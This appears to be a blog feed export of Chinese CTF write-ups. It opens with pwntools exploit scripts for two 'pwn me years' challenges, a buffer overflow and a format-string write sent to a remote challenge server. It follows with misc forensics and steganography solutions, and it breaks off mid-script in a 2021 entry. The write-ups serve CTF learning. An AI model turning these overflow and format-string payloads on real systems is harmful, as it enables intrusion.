<h3 id="pwn-me-years-I"><a href="#pwn-me-years-I" class="headerlink" title="pwn me  years!(I)"></a>pwn me  years!(I)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn_me_1&quot;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;139.129.76.65&#x27;</span>,<span class="number">50004</span>)</span><br><span class="line">payload = <span class="string">&#x27;yes\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p64(<span class="number">0x66666666</span>) + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn-me-years-II"><a href="#pwn-me-years-II" class="headerlink" title="pwn me years!(II)"></a>pwn me years!(II)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./2&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;139.129.76.65&#x27;</span>,<span class="number">50005</span>)</span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;your name:\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span> * offset + <span class="string">&#x27;%p&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;ring......\n&#x27;</span>)</span><br><span class="line">get = r.recv(<span class="number">14</span>)</span><br><span class="line"><span class="comment">#get = u64(r.recv()[0:6].ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;leak = &#x27;</span> + get</span><br><span class="line">get = <span class="built_in">int</span>(get,<span class="number">16</span>) - <span class="number">0x202080</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;addr = &#x27;</span> + <span class="built_in">hex</span>(get)</span><br><span class="line">target = get + <span class="number">0x0000000002020E0</span></span><br><span class="line">one = <span class="number">0x66666666</span></span><br><span class="line">target_len = <span class="built_in">len</span>(<span class="built_in">str</span>(target))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;target = &#x27;</span> + <span class="built_in">hex</span>(target)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x6666</span>) + <span class="string">&quot;c%9$hn%10$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x18</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(target) + p64(target+<span class="number">2</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload=&quot;%&quot; + str((one&gt;&gt;16)&amp;0xffff)+&#x27;c&#x27;+&quot;%9$hn&quot;</span></span><br><span class="line"><span class="string">payload+=p64(target+2)</span></span><br><span class="line"><span class="string">r.recvuntil(&#x27;you want?\n&#x27;)</span></span><br><span class="line"><span class="string">gdb.attach(r)</span></span><br><span class="line"><span class="string">r.sendline(payload)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2020V&amp;N招新赛Misc</title>
    <url>/2020/03/01/V&amp;N-find_new/</url>
    <content><![CDATA[<h2 id="拉胯的三条命令"><a href="#拉胯的三条命令" class="headerlink" title="拉胯的三条命令"></a>拉胯的三条命令</h2><p>打开压缩包结合题目描述，可以猜测这是一个nmap扫描端口的流量包，然后让找到开放的端口从小到大排列。Wireshark中nmap扫描流量，如果端口开放，则必有ack回应。<br>而且wireshark对于正常通信的tcp流量貌似都是高亮显示，ok，直接查看高亮的流量，统计这些流量的端口，其中有个重要的小细节，对于80端口的流量，因为其默认类型被当作http端口，所以wireshark会直接将其高亮，要看一下他的ack值是否为零才能正确判断80端口是否开放。于是得到一下端口号：<br>21<br>22<br>631<br>801<br>3306<br>5939<br>32848<br>60206<br>其中5939、32848、60206三个端口存在大量的“流量”，这不应该是端口扫描的流量，端口扫描是探查端口状态的，不应该有大量的数据交换，所以不考虑这三个端口，剩下的端口从小到大排列试一下，正确</p>
<h2 id="ML第一步"><a href="#ML第一步" class="headerlink" title="ML第一步"></a>ML第一步</h2><p>创建实例后浏览器直接访问发现这不是网站服务，那应该是应用类服务，用nc连接。</p>
<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/imagesVN-ML1.png" alt="link"></p>
<p>总之意思就是有一个未知函数y=f(x)，给出70组(x,y)。让我们求它的拟合方程。<br>然后他会给出10个x，让我们用拟合方程推测y的值，如果结果误差不超过0.06，就可以得到小旗子。<br>用python的matplotlib.pyplot画出散点图发现70组数据接近一条直线，直接脚本求解线性回归方程，然后去拿flag。求解脚本如下（ps：因为散点图的这条线有一点点弧度，所以我用了四次多项式，没有直接用一次的直线）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f_fit</span>(<span class="params">x,y_fit</span>):</span></span><br><span class="line">    a,b,c,d,e=y_fit.tolist()</span><br><span class="line">    <span class="keyword">return</span> a*x**<span class="number">4</span>+b*x**<span class="number">3</span>+c*x**<span class="number">2</span>+d*x+e</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;x=0.7587857855539164,y=-1.720845811051089\</span></span><br><span class="line"><span class="string">;x=0.13291321567620085,y=-0.44979144628012097\</span></span><br><span class="line"><span class="string">;x=0.989974986143239,y=-1.9690360825859337\</span></span><br><span class="line"><span class="string">;x=0.3576179200089157,y=-0.9003680552893811\</span></span><br><span class="line"><span class="string">;x=0.6031957139605361,y=-1.413869207317482\</span></span><br><span class="line"><span class="string">;x=0.8655969454196368,y=-1.8874775800952617\</span></span><br><span class="line"><span class="string">;x=0.48683649837550014,y=-1.2221034522056922\</span></span><br><span class="line"><span class="string">;x=0.1279800851084858,y=-0.3598626690513456\</span></span><br><span class="line"><span class="string">;x=0.01840117269743846,y=-0.0825695560842738\</span></span><br><span class="line"><span class="string">;x=0.49065439417804224,y=-1.2151317607134124\</span></span><br><span class="line"><span class="string">;x=0.745683162567403,y=-1.6542547149837732\</span></span><br><span class="line"><span class="string">;x=0.564686557840641,y=-1.4086742079578898\</span></span><br><span class="line"><span class="string">;x=0.5506578263400632,y=-1.328319038372737\</span></span><br><span class="line"><span class="string">;x=0.09890521425587329,y=-0.268867793932863\</span></span><br><span class="line"><span class="string">;x=0.9653080707668127,y=-1.9926065934683845\</span></span><br><span class="line"><span class="string">;x=0.49189934250857936,y=-1.2041799438406553\</span></span><br><span class="line"><span class="string">;x=0.47460948035678996,y=-1.1919570601329146\</span></span><br><span class="line"><span class="string">;x=0.7296637598789997,y=-1.626555486935713\</span></span><br><span class="line"><span class="string">;x=0.8772637406893159,y=-1.8444895108368027\</span></span><br><span class="line"><span class="string">;x=0.5262847068436897,y=-1.26898790243642\</span></span><br><span class="line"><span class="string">;x=0.18375224095950315,y=-0.49792227912640824\</span></span><br><span class="line"><span class="string">;x=0.5302276810137457,y=-1.3245875742508557\</span></span><br><span class="line"><span class="string">;x=0.44598041870724514,y=-1.1407183813974087\</span></span><br><span class="line"><span class="string">;x=0.9297802591112221,y=-1.9038682460892118\</span></span><br><span class="line"><span class="string">;x=0.31768338032416477,y=-0.8380436760373051\</span></span><br><span class="line"><span class="string">;x=0.31932181828715034,y=-0.885221801261295\</span></span><br><span class="line"><span class="string">;x=0.6520599635229203,y=-1.5648743849645852\</span></span><br><span class="line"><span class="string">;x=0.6318704181747703,y=-1.5361822819084332\</span></span><br><span class="line"><span class="string">;x=0.33596049748295764,y=-0.9018941515966336\</span></span><br><span class="line"><span class="string">;x=0.1582929490762487,y=-0.4621575450764881\</span></span><br><span class="line"><span class="string">;x=0.611161054351204,y=-1.4819230001079216\</span></span><br><span class="line"><span class="string">;x=0.2273505730886458,y=-0.6426008674876235\</span></span><br><span class="line"><span class="string">;x=0.3434775350774453,y=-0.9440612715950338\</span></span><br><span class="line"><span class="string">;x=0.3424015864156754,y=-0.8739934996421624\</span></span><br><span class="line"><span class="string">;x=0.8593474128108042,y=-1.8415838175212416\</span></span><br><span class="line"><span class="string">;x=0.9385785550053852,y=-1.9041364608079328\</span></span><br><span class="line"><span class="string">;x=0.4943478784921591,y=-1.2315495557049194\</span></span><br><span class="line"><span class="string">;x=0.45739416734634764,y=-1.1594371513265878\</span></span><br><span class="line"><span class="string">;x=0.8929294113779981,y=-1.8615545670417983\</span></span><br><span class="line"><span class="string">;x=0.19881908699665485,y=-0.5530975791426536\</span></span><br><span class="line"><span class="string">;x=0.06396527084952186,y=-0.2248085775384525\</span></span><br><span class="line"><span class="string">;x=0.2686482544684099,y=-0.75603686845716\</span></span><br><span class="line"><span class="string">;x=0.6084930406339851,y=-1.4717769288575426\</span></span><br><span class="line"><span class="string">;x=0.22216290869419308,y=-0.5906772203093745\</span></span><br><span class="line"><span class="string">;x=0.5914604953995254,y=-1.4177038761692764\</span></span><br><span class="line"><span class="string">;x=0.2036532638797327,y=-0.5788918140417649\</span></span><br><span class="line"><span class="string">;x=0.4558490044828919,y=-1.1682771304121138\</span></span><br><span class="line"><span class="string">;x=0.18324091786354268,y=-0.5788763881712895\</span></span><br><span class="line"><span class="string">;x=0.5421407829934451,y=-1.328797280920123\</span></span><br><span class="line"><span class="string">;x=0.4056810838054147,y=-1.0890377739166588\</span></span><br><span class="line"><span class="string">;x=0.39311134509953427,y=-1.037818315593108\</span></span><br><span class="line"><span class="string">;x=0.452612604644542,y=-1.2237566644854736\</span></span><br><span class="line"><span class="string">;x=0.2615352628059312,y=-0.70346972932896\</span></span><br><span class="line"><span class="string">;x=0.8901625763679877,y=-1.8806707950314019\</span></span><br><span class="line"><span class="string">;x=0.28280744763980337,y=-0.8231345793908345\</span></span><br><span class="line"><span class="string">;x=0.09628463850897795,y=-0.24971993270496043\</span></span><br><span class="line"><span class="string">;x=0.16481384396642307,y=-0.46946630708368303\</span></span><br><span class="line"><span class="string">;x=0.2847357540218156,y=-0.7947718784607872\</span></span><br><span class="line"><span class="string">;x=0.5319011449268986,y=-1.2668856188466802\</span></span><br><span class="line"><span class="string">;x=0.1081951088228772,y=-0.2536241872065086\</span></span><br><span class="line"><span class="string">;x=0.08836473591694316,y=-0.23153637261490673\</span></span><br><span class="line"><span class="string">;x=0.38840371594123335,y=-1.0336677376652563\</span></span><br><span class="line"><span class="string">;x=0.7720822530882997,y=-1.6953637803062263\</span></span><br><span class="line"><span class="string">;x=0.36229637982212415,y=-0.9854786906183374\</span></span><br><span class="line"><span class="string">;x=0.9519976240184558,y=-1.929418000224495\</span></span><br><span class="line"><span class="string">;x=0.5783183065134814,y=-1.3777929584428186\</span></span><br><span class="line"><span class="string">;x=0.5906565476132922,y=-1.4103866887242276\</span></span><br><span class="line"><span class="string">;x=0.8171334469097077,y=-1.748680676187232\</span></span><br><span class="line"><span class="string">;x=0.668796106230006,y=-1.5411754553626387\</span></span><br><span class="line"><span class="string">;x=0.581250276261842,y=-1.395451210048179&quot;</span></span><br><span class="line"></span><br><span class="line">data_list = data.split(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data_list:</span><br><span class="line">    i_list = <span class="built_in">str</span>(i).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    x.append(<span class="built_in">float</span>(i_list[<span class="number">0</span>][<span class="number">2</span>:]))</span><br><span class="line">    y.append(<span class="built_in">float</span>(i_list[<span class="number">1</span>][<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line">x = np.array(x)</span><br><span class="line">y = np.array(y)</span><br><span class="line"></span><br><span class="line">y_fit=np.polyfit(x,y,<span class="number">4</span>)<span class="comment">#二次多项式拟合</span></span><br><span class="line">y_show=np.poly1d(y_fit)<span class="comment">#函数优美的形式</span></span><br><span class="line"><span class="built_in">print</span>(y_show)<span class="comment">#打印</span></span><br><span class="line">y1=f_fit(x,y_fit)</span><br><span class="line">plt.plot(x,f(x),<span class="string">&#x27;r&#x27;</span>,label=<span class="string">&#x27;original&#x27;</span>)</span><br><span class="line">plt.scatter(x,y,c=<span class="string">&#x27;g&#x27;</span>,label=<span class="string">&#x27;before_fitting&#x27;</span>)<span class="comment">#散点图</span></span><br><span class="line">plt.plot(x,y1,<span class="string">&#x27;b--&#x27;</span>,label=<span class="string">&#x27;fitting&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;polyfitting&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">plt.legend()<span class="comment">#显示标签</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>然后去用得到的函数式推测十个y值，得到flag（如下图）：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-ML2.png" alt="VN-ML2.png"></p>
<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p>检查镜像信息，然后终端进程文件查看一条龙。<br>终端没有发现什么有用的，进程直接浏览器记事本画图磁盘加密四个emmm，文件查看什么都没有。<br>一开始想用notepad查看记事本内容，然后发现不支持。无奈-h查看帮助，看了半天找到一个editbox，可以查看编辑器的内容，于是成功获得百度云分享链接内容：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-内存1.png" alt="VN-内存1.png"><br>拿到一个VOL，很明显这应该就是加密的磁盘文件，将Truecrypt进程dump下来，用efdd工具破解密码挂载到本地，获取到key：uOjFdKu1jsbWI8N51jsbWI8N5。<br>至此四个进程用去三个，很明显最后的提示信息应该就在画图进程里。<br>将mspaint进程dump出来，用gimp分析，宽1728，偏移2kw时，得到：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-内存2.png" alt="VN-内存2.png"><br><del>好了，剩下的真不行了，图像信息只分析出来这一个，不知道这个字符串怎么和key用，推测是一种加密，但没找到别的提示信息，搞不定了emmmmm</del><br>套娃可耻！！！到网上下载一个TrueCrypt，用它挂载VOL，密码就是刚刚的key，然后拿到压缩包，密码是上面的画图的内容，开头那个是‘1’，一开始以为是I，然后不对就试了下‘l’和‘1’，出了flag</p>
<h2 id="Final-Game"><a href="#Final-Game" class="headerlink" title="Final Game"></a>Final Game</h2><h3 id="Malebolge-Online"><a href="#Malebolge-Online" class="headerlink" title="Malebolge Online"></a>Malebolge Online</h3><p>题目有一个压缩包和一个vmdk，先看看压缩包，里面有个文本，说是一些有用的东西，看来是解题提示，但是加密了，旁边还有注释。说要去要去地狱的第八层emmm<br>发现加密文本的文件名也是地狱的英文单词，谷歌一下看看是不是有猫腻。这里有一说一运气了一下。<br>直接搜索这个单词只能搜出来相关的宗教知识，不过因为我懒得手打，就<code>f2</code> 文件，然后 <code>ctrl a</code> <code>ctrl c</code> 了，于是我谷歌的是这个单词后面跟了 <code>.txt</code> 的后缀，直接就搜出来一个 Malebolge online ，打开发现也是一种类似 <code>brain fuck</code> 的语言，很明显，注释里面的内容拉进来运行，得到一串字符串，这应该就是解压密码了。<br>然后解压缩成功，打开文本查看提示：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG1.png" alt="VN-FG1.png"><br>很明显，这些就是解题相关的文件。接下来该去看vmdk了。</p>
<h3 id="vmdk-find-file"><a href="#vmdk-find-file" class="headerlink" title="vmdk find file"></a>vmdk find file</h3><p>7z打开vmdk，发现这真就把c盘弄下来小半emmm，听人说里面有lamber师傅的照片，本来准备直接拿相关文件的手控制不住的就一个个文件夹的点过去找照片了2333。<br>咳咳，说正经的说正经的。这里直接用修改时间排序查看最后修改的文件夹，一般和题目相关的文件都是最后修改或者访问的，毕竟出完题要先测试一下复现。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG2.png" alt="VN-FG2.png"><br>这里有个坑，只看修改时间和访问时间会发现只有它是放题的地方，但是如果进入到下面的 <code>user</code> 文件夹下的 <code>lenovo</code> 会发现外面看修改和访问都是11月1日，进去之后反而有6号和7号的，还好我为了找某人的照片专门跑过来看了2333<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG3.png" alt="VN-FG3.png"><br>所有放题目文件的位置都找到了，一一把题目文件提取出来。</p>
<h3 id="NTFS-ELF"><a href="#NTFS-ELF" class="headerlink" title="NTFS + ELF"></a>NTFS + ELF</h3><p>发现各个文件不是结构有问题就是有密码，这时想到提示说有ntfs，就用工具扫了一下，发现 <code>door.png</code> 后面藏了一个exe，运行一下他说要<strong>放在炼狱下运行</strong>。又提示 Mr.png才能上天堂，这里我一开始以为是有什么png图片需要拿过来，但是找了半天找不到别的啥图片555，然后干脆去逆向分析这个exe。<br>于是乎，一个下午没了，这程序保护全开上的强壳，吐了。后来突然想到是不是把别的题目文件和它放一起就行了，就把别的文件拉了过来。ok，拿到提示：需要修复elf。</p>
<p><del>~这里又是几个小时各种查elf修复emmm。被自己蠢哭，这是misc不是re！！！</del>~</p>
<p>按照misc的文件修复思路走那坑定是个别固定的文件十六进制数据被修改了，于是直接搜索elf的文件格式，发现文件开头应该是 <code>7f</code> 的被改了，改回来。然后试了下用kali运行，发现报错，可能是改了别的地方，这里百度到可以用Linux下的 <code>readelf -h filename</code> 查看elf文件的结构信息，发现elf类型是none，猜测是这里错了。这里我用了 <code>010 Editor</code> 的模板功能，这玩意真好用，直接一键选择类型。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG4.png" alt="VN-FG4.png"><br>然后运行程序：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG5.png" alt="VN-FG5.png"><br>emmm，还是ida看一下吧。箭头指向的应该是main函数地址。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG6.png" alt="VN-FG6.png"><br>分析main函数，发现这里进行了一次判断，如果向程序传参的值大于1，则跳过该处。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG7.png" alt="VN-FG7.png"><br>传一个参数 2 运行试试：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG8.png" alt="VN-FG8.png"><br>得到提示，很明显是让我们解md5，在线网站跑一下，得到 <code>evoA</code><br>这里我没分析出来v4的值受什么影响，不过看到这个evoA，我猜测<code>v4[1]</code>是传入参数的字符长度，那么接下来把evoA作为参数传入。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG9.png" alt="VN-FG9.png"><br>得到一串字符，开头是pdf，应该是pdf的密码。去查看pdf内容。</p>
<h3 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h3><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG10.png" alt="VN-FG10.png"><br>键盘密码，看着键盘转换一下，根据明文内容可知表情符号是空格。得到：</p>
<pre><code>The password of word is capital(PROVERBS OF GOD)
</code></pre><h3 id="Word"><a href="#Word" class="headerlink" title="Word"></a>Word</h3><p>拿到word压缩包的密码，去查看word，打开发现是一个图片的十六进制，因为字符太多，这里我用脚本转了，python的python-docx库可以操作docx，先把docm格式另存为docx格式，提示有宏，先看一下宏的内容<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG11.png" alt="VN-FG11.png"><br>是一堆base64，写个脚本解一下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑到base64隐写，先解一下base64，这里有个不算坑的坑，宏生成的文本换行只有一个\r，没有\n，所以python会把其当作一行</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ba.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lines = f.readline().split(<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        stegb64 = <span class="built_in">str</span>(line).replace(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;\n&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        rowb64 =  <span class="built_in">str</span>(base64.b64encode(base64.b64decode(stegb64))).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]) - b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">                <span class="comment">#flag += chr(int(bin(offset)[2:].zfill(equalnum * 2), 2))</span></span><br><span class="line">                <span class="comment">#print(flag) #这样写得不出正确结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里是正常解文本base64</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ba.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fi,<span class="built_in">open</span>(<span class="string">&#x27;ba_de&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> io:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> fi.readlines():</span><br><span class="line">                <span class="comment">#print(type(i.strip()))</span></span><br><span class="line">                io.write(base64.b64decode(i.strip()))</span><br><span class="line">        shutil.copy(<span class="string">&#x27;ba_de&#x27;</span>,<span class="string">&#x27;ba_de.tmp&#x27;</span>)</span><br><span class="line">        os.remove(<span class="string">&#x27;ba.txt&#x27;</span>)</span><br><span class="line">        os.rename(<span class="string">&#x27;ba_de&#x27;</span>,<span class="string">&#x27;ba.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;finish&#x27;</span>)</span><br></pre></td></tr></table></figure><br>运行发现base64藏了东西。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG12.png" alt="VN-FG12.png"></p>
<p>然后再去查看十六进制转换出来的文件，是一个被修改了文件头的png，改回来，stegslove发现存在lsb隐写，推测是带密码的lsb，用GitHub上的cloacked-pixel解，上面的base64隐写内容为密钥<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG13.png" alt="VN-FG13.png"><br>得到最后osz文件压缩包的密码。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG14.png" alt="VN-FG14.png"></p>
<h3 id="OSZ"><a href="#OSZ" class="headerlink" title="OSZ"></a>OSZ</h3><p>这里我以前没玩过osu，所以就按照正常流程走。<br><em>其实玩过的大佬直接还是要正常走下去23333</em><br>拖进kali里面发现直接变成了压缩包图标的文件，解压缩得到一个文件夹<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG15.png" alt="VN-FG15.png"></p>
<p>进去看看：   一堆音频和一个<code>Read.jpg</code>加一个<code>osu</code>后缀的疑似文本的文件.<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG16.png" alt="VN-FG16.png"></p>
<p>文本打开osu后缀的文件，顺便strings看一下<code>Readme.jpg</code>。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG17.png" alt="VN-FG17.png"></p>
<p>jpg结尾跟的有东西，osu后缀给了一个b站av号。先查看这个av号的视频。发现是一个叫<code>osu</code>的音频相关的编辑器，搜一下，知道是一种音游，比节奏大师要难很多emmm。下载<code>osu!</code>，将<code>paradise.osz</code>用<code>osu!</code>打开，然后没发现什么问题，不过大概了解一下玩法，推荐看到的各位入手嘿嘿嘿。再去看看jpg后面的内容：</p>
<pre><code>in,map.flag,is :0036112S0038362y0042112c0055162&#123;011091201187120135512014211201581630200412020386202163120219762022531202313120251862030251203121120318412032962803424120352837035853704093370420137044346204471370450062045786205147370514737051586205165370525312052606205301870548562&#125;Traversing.Time
</code></pre><p>在map里，flag是xxxxxxx，结合它的玩法和群里师傅的说法，看来是让我画flag了emmmm，把字符<code>Syc&#123;</code>前的数字当成时间，进入地图编辑器里查看相关时间的内容发现</p>
<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG18.png" alt="VN-FG18.png"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG19.png" alt="VN-FG19.png"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG20.png" alt="VN-FG20.png"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG21.png" alt="VN-FG21.png"></p>
<p>果然是看图像拼flag，这里就跟着时间节点一个个记录flag数值即可。<br>在记录一下拼flag时遇到的小坑：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200303184416.png" alt="20200303184416.png"><br>这几个选择全部关掉！！！不然后面有几个字符显示的部分不全认不出来是什么emmm，还有下面这里，一开始我记录flag的时候有好几个都是这样给了一个点，给我整蒙了，后来意识到这点上有数字，这个数字就是flag的值emmm，剩下的就是看形状了，反正md5的字符是十六进制的字符，实在顶不准就标记一下手工爆破吧，这里实在不想再回去一个个复查了555<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200303184637.png" alt="20200303184637.png">))</p>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-Radhat</title>
    <url>/2021/05/08/2021redhat/</url>
    <content><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>题目名：EBCDIC。EBCDIC编码打开即可看到flag</p>
<h3 id="colorful-code"><a href="#colorful-code" class="headerlink" title="colorful code"></a>colorful code</h3><p>题目名colorful code，文件data2里面总共0x300字节的数据，仔细查看发现除了前六十字节，后面的字节全是每三个字节一组<br>很明显，data2应该是像素值，而且可能只有前20组有用；</p>
<p>data1里面全是数字，统计一下发现只有0-19，很明显，就是对应data2前20组像素值，脚本转一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">color = [(<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>),(<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xc0</span>),(<span class="number">0x00</span>,<span class="number">0xff</span>,<span class="number">0xff</span>),(<span class="number">0x00</span>,<span class="number">0xff</span>,<span class="number">0x00</span>),(<span class="number">0xff</span>,<span class="number">0xc0</span>,<span class="number">0xff</span>),(<span class="number">0xff</span>,<span class="number">0xc0</span>,<span class="number">0xc0</span>),(<span class="number">0xc0</span>,<span class="number">0xc0</span>,<span class="number">0xff</span>),(<span class="number">0xc0</span>,<span class="number">0xc0</span>,<span class="number">0x00</span>),(<span class="number">0xff</span>,<span class="number">0x00</span>,<span class="number">0xff</span>),(<span class="number">0xff</span>,<span class="number">0x00</span>,<span class="number">0x00</span>),(<span class="number">0xc0</span>,<span class="number">0x00</span>,<span class="number">0x00</span>),(<span class="number">0xc0</span>,<span class="number">0x00</span>,<span class="number">0xc0</span>),(<span class="number">0xff</span>,<span 